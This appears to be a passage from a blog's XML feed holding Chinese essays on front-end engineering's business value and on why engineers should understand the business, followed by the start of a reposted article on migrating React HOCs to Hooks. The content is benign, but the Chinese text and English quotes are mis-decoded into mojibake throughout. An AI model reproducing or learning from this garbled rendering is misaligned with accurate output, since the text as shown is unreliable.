è¿˜è¦å†åšä¸€ä¸ªç±»ä¼¼çš„å§ï¼Œå¯¹ä¸šåŠ¡çš„æå‡åˆ°åº•åœ¨å“ªï¼Ÿ ä¸€èˆ¬ä¸€ä¸ªé‡è¦çš„ã€åˆç†çš„éœ€æ±‚éƒ½èƒ½æ¯”è¾ƒå¥½å›ç­”ä¸Šé¢è¿™äº›çš„é—®é¢˜ã€‚å…¶ä¸­ç¬¬ä¸‰ç‚¹ï¼Œæ•°æ®è¯´è¯ï¼Œä¹Ÿå¯¹å…¬å¸çš„æ•°æ®åŒ–èƒ½åŠ›æå‡ºäº†è¦æ±‚ã€‚ æœ€åŸºæœ¬çš„pv/uvã€uvç‚¹å‡»ç‡ã€åœç•™æ—¶é•¿ï¼Œè¿™æ˜¯å’Œå‰ç«¯é¡µé¢ç›¸å…³çš„æŒ‡æ ‡ã€‚ æ¨¡å—çƒ­åº¦ã€åŠŸèƒ½ä½¿ç”¨æƒ…å†µï¼Œè¿™æ˜¯ç”¨æ¥å’Œä¸šåŠ¡æ–¹æ’•é€¼çš„æ—¶å€™ä½¿ç”¨çš„ã€‚ï¼ˆä¸Šæ¬¡åšçš„åŠŸèƒ½ä½ ä»¬åˆä¸ç”¨ï¼ï¼‰ è¿˜æœ‰ä¸šåŠ¡æŒ‡æ ‡ï¼Œä¾‹å¦‚ç”µå•†çš„gmvã€å”®ç½„ç‡ï¼Œä½†è¿™äº›å’Œå‰ç«¯æ²¡ç›´æ¥å…³ç³»ã€‚ é«˜çº§ä¸€ç‚¹å¯ä»¥ç©GrowthHackï¼Œå…¨é“¾è·¯ç›‘æ§ç»†åˆ†ç”¨æˆ·ç¾¤çš„ä½¿ç”¨æƒ…å†µï¼Œæ¯”è¾ƒé€‚åˆä¸šåŠ¡å·²ç»å¢é•¿åˆ°ä¸€å®šä½“é‡ï¼Œç²¾ç»†åŒ–è¿è¥çš„åœºæ™¯ã€‚ å¤§æ•°æ®åˆ†æ+æ´å¯Ÿ+æ•°æ®å¯è§†åŒ–ã€‚ä¼šåœ¨ç¬¬ä¸‰éƒ¨åˆ†è®²è¿°ã€‚ å¦ä¸€ä¸ªä¸èƒ½å¿½è§†çš„æ˜¯ï¼Œå¦‚ä½•å˜å¾—æ›´ã€ç¨³ã€ï¼Œå› ä¸ºå¤§å®¶éƒ½å¾ˆæ€¥ï¼Œä¸€æ€¥å°±å®¹æ˜“å‡ºçº¿ä¸Šæ•…éšœï¼Œç„¶åæ—¶é—´éƒ½èŠ±åœ¨å¤„ç†æ•…éšœä¸Šäº†ï¼Œç„¶åæ—¶é—´å°±æ›´æ€¥ï¼Œä¸€ä¸ªå¿«é€Ÿè…åŒ–çš„æ­»å¾ªç¯ï¼Œç„¶åä½ èƒ½æ€ä¹ˆåŠå‘¢ï¼Ÿåªèƒ½ä»¥çŒæ­»æ˜å¿—å•Šâ€¦â€¦å¸¸è§çš„æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼š ç ”å‘æµç¨‹ç®¡æ§ã€‚ä¸ç»æµ‹è¯•ä¸å…è®¸ä¸Šçº¿ï¼Œè¿™ä¹Ÿæ˜¯é˜¿é‡Œçš„ç ”å‘çº¢çº¿ï¼Œçœ‹èµ·æ¥æ˜¯æ•ˆç‡é™ä½çš„ï¼Œä½†å…¶å®åªæ˜¯æŠŠå¤„ç†çº¿ä¸Šé—®é¢˜çš„æ—¶é—´ç”¨æ¥æµ‹è¯•äº†è€Œå·²ã€‚ åŸºç¡€åº“ã€åŸºç¡€ç»„ä»¶ ä¸Šå•å…ƒæµ‹è¯•ï¼Œä»£ç è¦†ç›–ç‡90%+ ç›‘æ§ã€‚çº¿ä¸Š404ã€é¡µé¢ç™½å±ã€js/æ¥å£æŠ¥é”™ç­‰ã€‚ å®‰å…¨ã€‚æœ€åŸºæœ¬çš„xssã€csrfåšä¸€ä¸‹ï¼Œå†æ•´ä½“å‡ä¸€ä¸‹https é—®é¢˜å¤ç›˜ã€æ²‰æ·€æœºåˆ¶ã€‚é¿å…å†å‡ºåŒæ ·çš„é—®é¢˜ã€‚ ä»¥ä¸Šè¿™äº›é—®é¢˜è§£å†³äº†ï¼Œå‰ç«¯åŒå­¦ä¹Ÿå°±ç®—æ˜¯åˆå¿«åˆç¨³åœ°å¸®ä¸šåŠ¡åº¦è¿‡äº†å¿«é€Ÿå‘å±•æœŸï¼Œè¿æ¥ä¸šåŠ¡çš„ç²¾è€•ç»†ä½œæœŸã€‚ ä¸‰ã€ç²¾è€•ç»†ä½œä¿—è¯è¯´å¾—å¥½ï¼šæ”»åŸå®¹æ˜“å®ˆæˆéš¾ï¼Œä½†ç°åœ¨æ”»åŸä¹Ÿä¸é‚£ä¹ˆå®¹æ˜“äº†ã€‚ç°åœ¨æ–°å…´çš„ç‹¬è§’å…½ï¼ŒèƒŒåéƒ½æœ‰ATçš„å½±å­ï¼Œä¾‹å¦‚ofoå’Œæ‘©æ‹œï¼ŒåŒæ–¹éƒ½æéš¾ä¸€ä¸‹å­æ‘æ­»å¯¹æ–¹ã€‚è€Œæ˜¯äº’æ‹¼å†…åŠ›ï¼Œæœ€åå¾ˆå¯èƒ½è½å¾—ä¸¤è´¥ä¿±ä¼¤ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦ç¨³ä¸­æ±‚å¿«ã€‚ å‰ä¸¤ä¸ªé˜¶æ®µçš„Cç«¯åœºæ™¯çœ‹èµ·æ¥å’Œå‰ç«¯å…³ç³»æ›´åŠ ç´§å¯†ï¼Œé‚£ä¹ˆè¿™ä¸ªé˜¶æ®µå’Œå‰ç«¯æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿæˆ‘è§‰å¾—èƒ½åšçš„äº‹æƒ…æœ‰ï¼š ä¸­åå°ç³»ç»Ÿçš„æ„å»ºã€‚ å°†è¿è¥ä»¬çš„å·¥ä½œçº¿ä¸ŠåŒ–ï¼ŒåŒæ—¶å‡å°‘éƒ¨åˆ†æ‰‹å·¥æ“ä½œï¼Œè¾¾åˆ°æ•ˆç‡çš„æå‡ã€‚ è™½ç„¶è¯´è¿è¥ä»¬é€šå¸¸excelç”¨å¾—è™è™ç”Ÿé£ï¼Œä½†æœ‰å®¹æ˜“å‡ºé”™ã€è´ªè…è¾ƒå¤šçš„é—®é¢˜ï¼Œæƒ³æƒ³ofoè¢«æ›è´ªè…ä¸¥é‡çš„æ–°é—»ã€‚ åœ¨ä¸å°‘ç¼ºå‰ç«¯çš„å…¬å¸ï¼Œè¿™éƒ¨åˆ†é€šå¸¸ä¹Ÿç”±åç«¯ç”¨jQueryä¸€æŠŠæ¢­ã€‚ä½†åç«¯æ’¸å‡ºæ¥ç³»ç»Ÿï¼Œé€šå¸¸éƒ½æ¬ ç¼ºäº¤äº’æ„è¯†ï¼ˆæ— å¯¼èˆªã€æŠ¥é”™ä¿¡æ¯ç­‰è®¾è®¡ï¼‰ã€æ’¸ä¸å‡ºç¨å¾®å¤æ‚çš„å¸ƒå±€ï¼ˆè§è¿‡è¢«floatå’Œflexéš¾ä½çš„ï¼‰ã€ç¼ºå°‘åŠ¨æ•ˆã€SPA ç­‰ï¼Œåšå‡ºæ¥çš„ç³»ç»ŸçœŸçš„å·®ä¸å°‘ï¼Œéƒ½9012å¹´äº†ï¼Œè¿˜æ˜¯è®©ä¸“äººæ¥å¹²è¿™æ´»å§ã€‚è®°å¾—åŠ ä¸Šæ°´å°ï¼ŒåŒ…æ‹¬æ˜æ°´å°å’Œæš—æ°´å°ï¼Œä¾¿äºå…¬å¸æ—¶å€™è¿½è´£ï¼Œé—´æ¥é˜²æ­¢å…¬å¸æœºå¯†å¤–æ³„ã€‚ å¤§æ•°æ®å¯è§†åŒ–ã€‚ ä¸ä»…ä»…æ˜¯æ¶ˆè´¹è€…ç«¯é¡µé¢çš„è®¿é—®æ•°æ®ï¼Œè¿˜æœ‰æ›´æ·±å±‚æ¬¡çš„å…¬å¸è¿è¥æ•°æ®ã€‚ä¾‹å¦‚ofoå¯ä»¥å®æ—¶è·Ÿè¸ªè‡ªè¡Œè½¦çš„æŸåç‡ã€ç›‘æ§è½¦è¾†å¯†é›†ç¨‹åº¦ç­‰ï¼Œä»è€ŒæŒ‡æŒ¥è°ƒåº¦è½¦çš„è°ƒåº¦ï¼Œè¾¾åˆ°è½¦è¾†æŠ•æ”¾å’Œä½¿ç”¨ç‡çš„æœ€ä½³åŒ¹é…ã€‚è™½ç„¶è¿™äº‹å„¿å§ï¼Œæ ¸å¿ƒè¿˜æ˜¯æ•°æ®åŒå­¦äº§å‡ºæ•°æ®çš„å‡†ç¡®æ€§ï¼Œä½†å‰ç«¯åŒå­¦çš„é…åˆæ˜¯ä¸å¯æˆ–ç¼ºçš„ã€‚ å¸¸è§çš„å¯ä»¥ç”¨æ¥åšè¿™äº‹å„¿çš„æœ‰Echartsã€HighChartsã€G2ç­‰ç­‰ï¼Œè™½ç„¶æˆ‘ä»¬åŸºæœ¬ä¸å¯èƒ½å†é‡å¤è‡ªç ”ä¸€å¥—ï¼Œä½†å–å…¶ç²¾åï¼Œå¿«é€Ÿèµ‹èƒ½ä¸šåŠ¡ï¼Œå°±æ˜¯ä¸šåŠ¡å‰ç«¯çš„ä»·å€¼æ‰€åœ¨ã€‚ å¹³å°åŒ–ã€‚ æ­¤å¤„å…¶å®æŒ‡çš„æ˜¯å¤§ä¸­å°ã€å°å‰å°çš„æ¦‚å¿µã€‚å› ä¸ºæˆ‘ä»¬å¾€å¾€å·²ç»ç§¯ç´¯äº†ä¸€æ‰¹ä¸­åå°ç³»ç»Ÿï¼Œä½†å¦‚ä½•ä½¿åŒä¸€ä¸ªç³»ç»Ÿæ›´å¿«æ”¯æ’‘æ–°çš„ä¸šåŠ¡ã€ç æ‰/åˆå¹¶é‡å¤åŠŸèƒ½çš„ä¸­åå°ç³»ç»Ÿï¼Œä¹Ÿæ˜¯è¾…åŠ©ä¸šåŠ¡çš„ä¸€ç§æ‰‹æ®µã€‚ ABTestã€‚ æ ¹æ®ä¹‹å‰çš„ç»éªŒï¼Œç”µå•†ä¸åŒè¡Œä¸šçš„ä¸åŒäººç¾¤ï¼Œå¯¹äºäº¤äº’è®¾è®¡çš„åå¥½çœŸçš„å°±ä¸ä¸€æ ·ï¼Œæœ‰çš„å–œæ¬¢å¤§å›¾ï¼Œæœ‰çš„å–œæ¬¢å°å›¾ã€‚å› æ­¤é€šè¿‡ABTestæ–¹æ¡ˆï¼Œå¯¹äººç¾¤è¿›è¡Œåƒäººåƒé¢çš„ç»†åˆ†å±•ç°ï¼Œå¯¹ä¸šåŠ¡ä¹Ÿæ˜¯å¯ä»¥ç¨å¾®æœ‰ä¸€å®šçš„æå‡ã€‚ å®¹å™¨æŠ€æœ¯ï¼ˆhybrid &amp; å†…æ ¸ï¼‰&amp; æè‡´æ€§èƒ½ã€‚ å…¶å®ä¹Ÿå°±è¿™ä¹ˆæä¸€ä¸‹ï¼Œå› ä¸ºå¯¹äºå¤§å¤šæ•°å…¬å¸ï¼ŒçœŸæ²¡æœ‰æ·±å…¥è¿½æ±‚æµè§ˆå™¨å†…æ ¸æå‡çš„ä»·å€¼å’Œå¯èƒ½æ€§ã€‚ hybridæ–¹æ¡ˆæ˜¯æœ‰å¿…è¦çš„ï¼Œä½†åº”è¯¥åœ¨æ€¥å‰§æ‰©å¼ æ—¶æœŸå°±åšå¾—å·®ä¸å¤šäº†ã€‚ æè‡´æ€§èƒ½ä¹Ÿå±äºæ¯”è¾ƒç‚«æŠ€çš„ä¸œè¥¿äº†ï¼ˆå·²ç»åšåˆ°1~2sé¡µé¢å¯äº¤äº’çš„å‰æä¸‹ï¼‰ï¼ŒçŸ­æœŸå†…æ²¡æœ‰ç‰¹åˆ«å¤§çš„å¿…è¦ï¼Œä½†åœ¨è¿½æ±‚æè‡´æ€§èƒ½çš„è¿‡ç¨‹ä¸­ï¼Œè¿«ä½¿ç›¸å…³åŒå­¦æ·±å…¥äº†è§£å®¹å™¨æŠ€æœ¯ã€æœåŠ¡ç«¯ã€ç½‘å…³ã€cdnç­‰åº•å±‚ï¼Œå¹¶æ¨åŠ¨ç›¸å…³æ–¹å‡çº§ï¼Œç»è¿‡é•¿æ—¶é—´çš„ç§¯ç´¯ï¼Œå¸¦æ¥äººåŠ›å‚¨å¤‡å’ŒæŠ€æœ¯å‚¨å¤‡çš„æå‡ã€‚ å››ã€æ–°èµ›é“ã€æ–°å¢é‡æ—¶æœŸåŸºæœ¬ä¸Šåšå®Œä¸Šé¢é‚£äº›ä¸œè¥¿ï¼Œå…¬å¸çš„ä¸šåŠ¡è¿›å…¥ä¸€ä¸ªç¨³å®šçš„æ—¶æœŸï¼Œå°±æ˜¯åˆ°å¤„çœ‹çœ‹æœ‰ä»€ä¹ˆæ–°çš„ä¸œè¥¿å¯ä»¥åšäº†ã€‚ï¼ˆå½“ç„¶è¿˜æ˜¯å¯èƒ½æœ‰å„ç§å„æ ·è›‹ç¢çš„æ”¹ç‰ˆï¼‰ æ ¸å¿ƒ ç«¯çš„æ‰©å±•ï¼š åŒ…æ‹¬å„ç±»å°ç¨‹åºã€‚ åä¹‰ä¸Šæ˜¯ä¾¿äºç®¡æ§ç¬¬ä¸‰æ–¹ï¼Œæä¾›æ›´å¥½çš„ä½“éªŒï¼Œå…¶å®å°±æ˜¯äººä¸ºå‰²è£‚å‡ºä¸€ä¸ªç«¯ï¼ŒåŒæ—¶ç”¨æµé‡æŠŠè¿™ä¸ªç«¯å–‚èµ·æ¥ã€‚ä¸è¿‡æ²¡åŠæ³•ï¼Œè°è®©çˆ¸çˆ¸ä»¬æœ‰æµé‡å‘¢ã€‚ä½†æ³¨æ„ä¸€ç‚¹ï¼Œæ‰©å±•ä¸€ä¸ªç«¯æ˜¯æœ‰ç»´æŠ¤æˆæœ¬çš„ï¼Œä¸”å¹¶ä¸ä¼šç›´æ¥å¸¦æ¥æµé‡æ”¶ç›Šï¼Œéœ€è¦é…å¥—çš„è¿è¥è®¡åˆ’ã€‚ 3Dã€å…¨æ™¯ã€VR / AR ã€‚æœ‰å¯èƒ½å¸¦æ¥äº¤äº’æ ¹æœ¬å˜åŒ–çš„ä¸œè¥¿ï¼Œå”¯ä¸€çš„ç¼ºç‚¹æ˜¯ç§‘æŠ€è¿˜ä¸å¤Ÿå…ˆè¿›ï¼Œåšå…¨æ™¯ç´ ææˆæœ¬å¾ˆé«˜ï¼ŒVR/ARçš„åº”ç”¨åœºæ™¯ä¹Ÿä¸å¤Ÿå¤šã€‚ Flutterã€‚ æ™ºèƒ½åŒ–ï¼š ä¸šåŠ¡çš„æ™ºèƒ½åŒ–ã€‚ä¾‹å¦‚æ´»åŠ¨ç•Œé¢çš„åƒäººåƒé¢ï¼Œæ ¹æ®ç®—æ³•è®¡ç®—å‡ºæœ€ä½³ç•Œé¢å…ƒç´ ç»„åˆæ–¹å¼ç­‰ã€‚ ç ”å‘çš„æ™ºèƒ½åŒ–ã€‚ä¾‹å¦‚FBçš„Aromaã€ä¹‹å‰ä¸šå†…çš„psd2htmlï¼Œä½†è¿™ä¸ªç®—æ³•å’Œæ™®é€šçš„ç”µå•†æ¨èç®—æ³•ç›¸æ¯”ï¼Œæœ€å¤§çš„åŒºåˆ«åœ¨äºå®¹é”™ç‡æä½ï¼Œä½ æ¨èé”™äº†ä¸€ä¸ªå•†å“å¤§ä¸äº†ä¸ä¹°çœ‹ä¸‹ä¸€ä¸ªï¼Œä½†ä½ è‡ªåŠ¨ç”Ÿæˆé”™äº†ä¸€å¥ä»£ç ï¼Œæ•´ä¸ªç³»ç»Ÿå°±è·‘ä¸èµ·æ¥ã€‚ å®åœ¨ä¸çŸ¥é“å‰ç«¯è¿˜æœ‰ä»€ä¹ˆæ–°çš„ä¸œè¥¿å¥½å…³æ³¨çš„äº†ï¼Œç¡¬æ°ä¸å‡ºæ¥ï¼Œå°±è¿™æ ·å§ï¼Œæ¬¢è¿æŒ‡ç‚¹ã€‚ äº”ã€æœ€åè¯»å®Œæœ¬æ–‡ï¼Œç›¸ä¿¡ä½ å·²ç»æ‰¾åˆ°äº†å‰é¢ä¸‰ä¸ªé—®é¢˜çš„ç­”æ¡ˆï¼Œèƒ½å¤Ÿä¸å†è¢«ä¸€å †éœ€æ±‚æ¨ç€èµ°ï¼Œä¹Ÿèƒ½å¤Ÿä¸å†åªæ’¸ä¸šåŠ¡ä»£ç ï¼Œå­•è‚²å‡ºå±äºä½ ä»¬å›¢é˜Ÿçš„æŠ€æœ¯æ–¹æ¡ˆè€Œè·å¾—æŠ€æœ¯ä¸Šçš„æå‡ï¼Œæœ€é‡è¦çš„æ˜¯æ‰¾åˆ°è‡ªå·±çš„ä¸€èº«æœ¬é¢†åœ¨è¿™ä¸ªå•†ä¸šä¸–ç•Œä¸­çš„ä»·å€¼ï¼Œä¸å¿˜æå®¢æ¢¦ï¼ŒæŠ€æœ¯æ”¹å˜ä¸–ç•Œï¼ŒRock the Worldã€‚]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¼€å¥½ä¸€åœºä¼šï¼Œæ¯”å†™1000è¡Œä»£ç æ›´é‡è¦]]></title>
    <url>%2F2020%2F02%2F26%2F%E5%85%B6%E4%BB%96%2F%E5%BC%80%E5%A5%BD%E4%B8%80%E5%9C%BA%E4%BC%9A%EF%BC%8C%E6%AF%94%E5%86%991000%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%9B%B4%E9%87%8D%E8%A6%81%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªçŸ¥ä¹ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://zhuanlan.zhihu.com/p/33370262 å·¥ç¨‹å¸ˆåˆ°åº•éœ€ä¸éœ€è¦äº†è§£æŠ€æœ¯æ–¹æ¡ˆä»¥å¤–çš„ä¸œè¥¿ï¼Ÿ**ä¾‹å¦‚é¡¹ç›®çš„èƒŒæ™¯ã€å½“å‰é—®é¢˜ã€äº§å“æ–¹æ¡ˆã€è¿è¥ç­–ç•¥ç­‰ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬è¦åˆ†æƒ…å†µçœ‹å¾…ï¼š å¯¹äºååº•å±‚çš„å·¥ç¨‹å¸ˆï¼Œå¦‚ç½‘ç»œã€è¿ç»´ã€ä¸­é—´ä»¶ç­‰ï¼Œå¯èƒ½çš„ç¡®æ›´åŠ æ³¨é‡æŠ€æœ¯æŒ‡æ ‡ï¼Œå¯¹äºä¸Šå±‚çš„ä¸šåŠ¡åˆ°åº•æ˜¯æ€æ ·çš„ï¼Œä¸å…³å¿ƒä¹Ÿæ²¡å…³ç³»ã€‚ è€Œå¦ä¸€äº›å·¥ç¨‹å¸ˆåˆ™æ›´è´´è¿‘ä¸šåŠ¡ï¼Œä¸»è¦ä»äº‹äºä¸šåŠ¡ç›¸å…³çš„åº”ç”¨å¼€å‘ã€‚å¯¹äºè¿™éƒ¨åˆ†åŒå­¦è€Œè¨€ï¼Œæˆ‘è®¤ä¸ºï¼šç†è§£ä¸šåŠ¡æ˜¯ä¸€ä»¶éå¸¸é‡è¦çš„äº‹æƒ…ã€‚ å¼€å¥½ä¸€åœºé‡è¦çš„ä¼šï¼Œæ¯”å†™ä¸€åƒè¡Œä»£ç éƒ½é‡è¦ã€‚ä¸ºä»€ä¹ˆç†è§£ä¸šåŠ¡æ˜¯ä¸€ä»¶å¾ˆé‡è¦çš„äº‹æƒ…ï¼Ÿå¬æˆ‘æ…¢æ…¢é“æ¥ ä¸€ã€ç†è§£ä¸šåŠ¡ï¼Œèƒ½å¸®åŠ©ä½ ç¡®ä¿åšå‡ºæ¥çš„äº‹æƒ…æ˜¯æœ‰ä»·å€¼çš„ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬è¦å¯¹ä»€ä¹ˆæ˜¯æœ‰ä»·å€¼çš„åšä¸€æ¬¡å¯¹ç„¦ã€‚æˆ‘è®¤ä¸ºï¼Œä¸æ˜¯æŠŠä»£ç å†™å‡ºæ¥å°±ç®—æœ‰ä»·å€¼çš„ã€‚ å¯èƒ½æœ‰çš„æœ‹å‹è§‰å¾—ï¼šã€æˆ‘é ï¼Œè€å­çœŸdiaoï¼Œç»ˆäºæŠŠäº§å“è®©æˆ‘åšçš„ä¸œè¥¿åšå‡ºæ¥äº†ï¼Œæ™šä¸Šåƒé¸¡å»ã€‚ã€ ä½†æ˜¯ï¼Œæ•æˆ‘ç›´è¨€ï¼Œè¿™äº›ä¸œè¥¿æœ‰ä»€ä¹ˆç”¨å•Šï¼Ÿè¿˜ç»™åäººç•™å‘ã€‚ ä¸­åå°äº§å“å’Œæ¶ˆè´¹è€…ç«¯é¡µé¢ï¼Œä¸Šçº¿ä¸€ä¸ªæœˆå°±æ­»ï¼Œåé¢å†ä¹Ÿæ²¡äººç®¡çš„é¡¹ç›®è¿˜å°‘è§ä¹ˆï¼Ÿ åº•å±‚çš„å·¥å…·ã€ç»„ä»¶åº“ï¼Œé‡å¤é€ è½®å­ï¼Œåšäº†æ²¡äººç”¨ï¼Œåªèƒ½è‡ªå¨±è‡ªä¹ï¼Œè¿™æ ·çš„æƒ…å†µå°‘è§ä¹ˆï¼Ÿ è¿™äº›ä¸œè¥¿æ²¡ä»·å€¼çš„é€»è¾‘å¾ˆç®€å•ï¼šä¸€ä¸ªä¸œè¥¿æœ‰æ²¡æœ‰ä»·å€¼ï¼Œå–å†³äºå®ƒçš„ä½¿ç”¨æƒ…å†µï¼Œè€Œä¸æ˜¯å› ä¸ºä»…ä»…å› ä¸ºå®ƒå­˜åœ¨ã€‚ æ‰€ä»¥ç†è§£ä¸šåŠ¡ï¼Œèƒ½å¤Ÿå¸®åŠ©ä½ åœ¨é¡¹ç›®åˆæœŸå°±è¯†åˆ«ä»¥ä¸‹å’Œé¡¹ç›®ç”Ÿæ­»æœ‰å…³çš„å› ç´ ï¼š é¡¹ç›®çš„æ–¹å‘æ˜¯å¦æœ‰å¸‚åœºã€‚å·²ç»çº¢æµ·çš„å¸‚åœºï¼Œé™¤éèµ„æºéå¸¸å¤šï¼Œè¦ä¸è¿˜æ˜¯ç»•å¼€å§ã€‚ PDå‡ºçš„äº§å“æ–¹æ¡ˆæ˜¯å¦é è°±ã€‚åˆ«ä¸€å¼€å§‹äº§å“æ–¹æ¡ˆè€ƒè™‘ä¸å‘¨å…¨ï¼Œæœ€ååˆè¦æˆ‘æ¥åŠ ç­åˆ°æ­»æ”¹ä¸œè¥¿ã€‚ è¿è¥ç­–ç•¥æ˜¯å¦é è°±ã€‚ä¸œè¥¿åšå‡ºæ¥äº†æ²¡æœ‰è¿è¥ï¼Œæœ€åè€æ¿è¯´ï¼Œæ¯ä¸ªäººæ‹‰åä¸ªæœ‹å‹æ¥ç”¨ï¼Œå²‚ä¸æ˜¯å¾ˆå°´å°¬ã€‚ moreâ€¦â€¦ ä¹Ÿè®¸è¿˜æ˜¯æœ‰çš„å“¥ä»¬ä¼šè¯´ï¼šã€è¿™äº›å’Œæˆ‘æœ‰æ¯›å…³ç³»å•Šã€ã€‚å½“ç„¶æœ‰å…³ç³»å•Šï¼š å¯¹äºå¤§å…¬å¸è€Œè¨€ï¼Œé¡¹ç›®åšæ­»äº†ï¼Œå¯èƒ½ä½ KPIå°±æ²¡æ³•å†™äº†ã€‚ å¯¹äºåˆ›ä¸šå…¬å¸è€Œè¨€ï¼Œé¡¹ç›®åšæ­»äº†ï¼Œå¯èƒ½å…¬å¸å€’äº†ä½ çš„é¥­ç¢—å°±æ²¡äº†ã€‚ äºŒã€ ç†è§£ä¸šåŠ¡ï¼Œèƒ½å¸®ä½ è¯†åˆ«é‚£äº›çœŸæ­£é‡è¦çš„äº‹æƒ…ã€‚å¾ˆå¤šç¨‹åºå‘˜åŒå­¦ä¼šå“­çˆ¹å–Šå¨˜ï¼Œè§‰å¾—æ´»å¤ªå¤šåŠ ç­åŠ åˆ°åã€‚é™¤äº†ä¸€äº›é‡è¦ç´§æ€¥çš„é¡¹ç›®ï¼Œå…¶ä»–å¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬å®Œå…¨æ˜¯å¯ä»¥é€šè¿‡åˆ†æ¸…äº‹æƒ…çš„ä¼˜å…ˆçº§æ¥è§£å†³çš„ã€‚ é‡è¦åˆç´§æ€¥çš„äº‹æƒ…ã€‚ææ¸…æ¥šæ–¹æ¡ˆåå°±é©¬ä¸Šåšã€‚ é‡è¦ä¸ç´§æ€¥çš„äº‹æƒ…ã€‚æ”¾è¿›æ’æœŸé‡Œæœ‰åºåœ°åšã€‚ ç´§æ€¥ä¸é‡è¦çš„äº‹æƒ…ã€‚ç”¨æœ€ç®€å•çš„æ–¹æ³•åšã€‚ï¼ˆå…¶å®è¿™ç§åœºæ™¯å¹¶ä¸å¤šï¼Œæˆ‘ä¸å¤ªèƒ½æƒ³è±¡ä»€ä¹ˆäº‹æƒ…ä¸é‡è¦äº†è¿˜å¾ˆç´§æ€¥ï¼‰ ä¸ç´§æ€¥ä¸é‡è¦çš„äº‹æƒ…ã€‚ç—›ä¸‹ç éœ€æ±‚çš„å± åˆ€ã€‚ è€Œå¦‚æœä¸ç†è§£ä¸šåŠ¡ï¼Œæˆ‘ä»¬å¾€å¾€æ— æ³•åˆ†æ¸…æ¥šä»€ä¹ˆäº‹æƒ…æ˜¯é‡è¦çš„ï¼Œä»€ä¹ˆæ˜¯ç´§æ€¥çš„ã€‚ åªæœ‰ç†è§£ä¸šåŠ¡ï¼Œæˆ‘ä»¬æ‰èƒ½ä¸è¢«å¿½æ‚ ï¼Œè¯†åˆ«å‡ºé‚£äº›çœŸæ­£é‡è¦å’Œç´§æ€¥çš„äº‹æƒ…ï¼Œç æ‰é‚£äº›ç¹é‡è€Œæ— ç”¨çš„æ´»ï¼Œç©ºå‡ºæ›´å¤šçš„æ—¶é—´å­¦ä¹ å’Œæ€è€ƒï¼Œå½¢æˆè‰¯å¥½çš„æ­£å‘å¾ªç¯ã€‚ ä¸‰ã€ å­¦ä¹ äº§å“è®¾è®¡å’Œè¿è¥ç­–ç•¥ï¼Œå¯¹äºæŠ€æœ¯ç±»äº§å“ä¹Ÿå¾ˆæœ‰å¸®åŠ©ã€‚ç›¸ä¿¡ç¨å¾®æœ‰ç»éªŒæœ‰è¿½æ±‚çš„æŠ€æœ¯åŒå­¦éƒ½é‡åˆ°è¿‡è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼š è¾›è¾›è‹¦è‹¦åšäº†ä¸€ä¸ªä¸œè¥¿ï¼ˆå·¥å…·ã€åº“ã€ç»„ä»¶ï¼‰å‡ºæ¥ï¼Œæ€ä¹ˆå°±æ²¡äººç”¨å‘¢ï¼Ÿ æœ¬è´¨ä¸Šï¼Œä½ åšçš„ä¸œè¥¿ä¹Ÿæ˜¯äº§å“ï¼Œåªä¸è¿‡æ˜¯æŠ€æœ¯ç±»çš„äº§å“ï¼Œä¹Ÿéœ€è¦ç”¨äº§å“æ€ç»´æ¥è€ƒè™‘å’Œè§£å†³é—®é¢˜ï¼š ç°æœ‰åŒç±»äº§å“çš„ç—›ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿè¿™äº›ç—›ç‚¹æ˜¯å¦é‡è¦ï¼Ÿ ä½ çš„äº§å“å¸®åŠ©ç”¨æˆ·è§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿè¿™äº›é—®é¢˜æ˜¯å¦é‡è¦ï¼Ÿ ä½ çš„äº§å“çš„ç”¨æˆ·ä½“éªŒå¦‚ä½•ï¼Ÿ ç”¨æˆ·çš„è¿ç§»æˆæœ¬æ˜¯å¦è¶³å¤Ÿä½ï¼Ÿ moreï¼Œå­¦ä¹ ä¸­â€¦â€¦ è¿è¥ç­–ç•¥ä¹ŸåŒæ ·é‡è¦ï¼š äº§å“åˆæœŸæ¯”è¾ƒç²—ç³™çš„æ—¶å€™æ¨å¹¿å¤ªå¿«ï¼Œå®¹æ˜“ç»™ç”¨æˆ·å¸¦æ¥åæ„Ÿã€‚ äº§å“æ¨å¹¿å¤ªæ…¢ï¼Œåˆå®¹æ˜“è¢«ç«å“æŠ¢å å¸‚åœºã€‚ moreï¼Œå­¦ä¹ ä¸­â€¦â€¦ é€šè¿‡å‚ä¸ä¸€æ¬¡åˆä¸€æ¬¡çš„ä¼šè®®ï¼Œæå‡ºé—®é¢˜ï¼Œå­¦ä¹ ä¼˜ç§€äº§å“çš„è®¾è®¡å’Œè¿è¥æ€è·¯ã€‚å¯¹äºæŠ€æœ¯åŒå­¦è€Œè¨€ï¼Œæ— è®ºæ˜¯åšè‡ªå·±çš„ä¸œè¥¿è¿˜æ˜¯åˆ›ä¸šï¼Œéƒ½èƒ½èµ·åˆ°å¾ˆå¤§çš„å¸®åŠ©ã€‚]]></content>
      <categories>
        <category>å…¶ä»–</category>
      </categories>
      <tags>
        <tag>å…¶ä»–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[How to migrate from HOCs to Hooks]]></title>
    <url>%2F2020%2F02%2F25%2FWeb%E5%89%8D%E7%AB%AF%2FHow%20to%20migrate%20from%20HOCs%20to%20Hooks%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://dev.to/bnevilleoneill/how-to-migrate-from-hocs-to-hooks-4g3a The future is here, and youâ€™re loving every single second of writing your React code with Hooks. Youâ€™re all like â€œuseThisâ€ and â€œuseThatâ€ and are having the time of your life implementing cross-cutting concerns with this new React feature. Then, out of nowhere, your manager tells you to fix a bug in some existing code. You know, that legacy crap you wrote in December of 